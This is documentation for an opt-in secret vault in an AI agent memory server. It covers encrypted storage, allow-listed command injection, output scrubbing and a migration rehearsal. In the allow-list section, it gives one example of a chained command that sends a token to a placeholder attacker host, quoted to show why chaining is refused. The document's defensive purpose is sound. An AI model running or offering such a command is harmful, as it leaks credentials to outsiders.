# The vault: knowing without telling

**Opt-in.** Set `AWM_VAULT=on` in the AWM server's environment. Off (the default), secrets are
masked and forgotten as described in [`redaction.md`](redaction.md).

Write-time redaction protects a credential by destroying it. That is safe, but a memory that
forgets what it knows is not much of a memory: the reason to remember the Railway token is to
deploy with it next week. The danger was never *knowing* a secret. It is *telling* it, whether
into a transcript, an export, another agent or a log. The vault keeps the value and controls who
it is told to.

## What changes when it is on

| | Vault off (S1) | Vault on |
|---|---|---|
| A secret in a write | Masked: `[REDACTED:stripe_key …0dWz]` | Sealed: `[VAULT:stripe_key …0dWz #3f9c2e71b0d4]` |
| The value | Gone | Encrypted in `vault.db`, beside the store |
| Recall | Finds the memory, with the mask | Finds the memory, with a handle it can use |
| The same secret written again, even with no label | Caught only if a rule sees its shape | Recognised as a known secret and replaced by its handle, anywhere |
| Using it | Not possible | `awm vault run`, into an allowed command, value scrubbed from output |
| Reading it | Not possible | `awm vault reveal`, by a person at an interactive terminal |

## Where things live

- **`vault.db`** holds AES-256-GCM ciphertexts, next to `memory.db` (override with
  `AWM_VAULT_PATH`). It is a separate file, so exporting, backing up or sharing `memory.db`
  never carries a secret.
- **The key** is in the operating system's credential store: Windows Credential Manager, macOS
  Keychain, or Secret Service on Linux. It is unlocked by your own login, with no passphrase
  prompt, which an MCP server could not show anyway.
  - Where no credential store exists (a headless container), the key falls back to `vault.key`
    beside the vault. `awm vault status` says which, and the file fallback is weaker: anyone who
    can read both files can open the vault.
  - If the key is lost, the vault refuses to open rather than minting a new key that decrypts
    nothing.

## Using a sealed value

An agent that recalls a handle is told how to use it. It runs, through its own shell:

```
awm vault run 3f9c2e71b0d4 --env RAILWAY_API_TOKEN -- railway up --service rowos-app --ci
```

The value goes into that one command's environment. Whatever the command prints has the value
replaced by its handle before the agent sees it.

`run` only injects into a command whose prefix **you** allowed:

```
awm vault allow 3f9c2e71b0d4 "railway up"
```

Three rules make the allow-list mean something:
- A command that chains or redirects (`;`, `&&`, `|`, `>`, backticks, `$(`) is never allowed by
  prefix. Otherwise `railway up; curl evil.example -H "$TOKEN"` would pass as "starts with
  railway up".
- Anything not allowed is refused when there is no terminal, which is always the case for an
  agent. At your own terminal you are asked instead.
- Allowing an interpreter or network tool (`node`, `python`, `bash`, `powershell`, `curl`…)
  prints a warning, because such a command can do anything with the value. Allow the specific
  tool instead.

`awm vault reveal <id>` prints a value. It only runs at an interactive terminal and asks you to
type the id, so an agent's shell cannot use it. **There is no MCP tool that returns a value**:
anything the model reads lands in the transcript.

## Bringing an existing store up to date

```
awm vault migrate            # dry run: what would be sealed
awm vault migrate --apply    # stop AWM sessions first
```

`--apply` makes a backup of `memory.db` first, then runs two passes:
1. It seals every secret the rules can see in memory text.
2. It sweeps **every text column of every table** (memories, recall logs, checkpoints,
   coordination tasks and messages, entity mentions) and `awm.log` for the rules *and* every
   value the vault now knows.

Then it optimizes the full-text index and vacuums the file, because an `UPDATE` alone leaves the
old text in free pages.

**The backup still holds every secret in plaintext.** Check that the store works, then delete
the backup.

### Rehearsed on a copy of a real store (19,071 memories, 2026-10-28)

- **Sealed:** 63 memories, 40 distinct values. Pass 2 found the same values in **439 more rows**:
  - unlabelled repeats of the same passwords in 20–40 later memories;
  - coordination tasks, events and mailbox rows;
  - entity mentions and recall logs.
- **What remained:** a byte-level search of the migrated file for each of the 40 exact sealed
  values found **0** anywhere, in any table, index or free page.
- **The values still open:** every handle opens to its original value.
- **It still knows that it knows:** eight plain-language questions ("USEF API production client
  secret", "Mandrill SMTP credentials", …) returned the **same #1 result before and after** for
  all eight, with 39 of 40 top-five results unchanged.

Three things the first rehearsal got wrong, each now fixed and covered by a test:
- **An `await` was missing.** The vault closed before the migration ran. The safety fallback
  held: every value was masked and none was stored in plaintext.
- **Repeats had no label.** The same passwords appeared in later memories with no label for the
  rules to see. This is why sealing now teaches the vault the value, and why pass 2 exists.
- **Two placeholder values were sealed:** a deliberately fake test-URL password and a TypeScript
  type annotation.

## Limits

- **Shape and repetition only.** A secret with no recognisable shape and no label, written
  before anything taught the vault its value, is not caught.
- **Output scrubbing is literal.** A command that prints the value base64-encoded or split across
  lines gets past it. Allow only tools that do not echo their credentials.
- **Rotation drift.** A sealed value goes stale when you rotate the real key. `awm vault forget`
  removes it; the memories keep the dead handle.
- **SQLite stores only for `migrate`.** New writes are sealed on every backend.
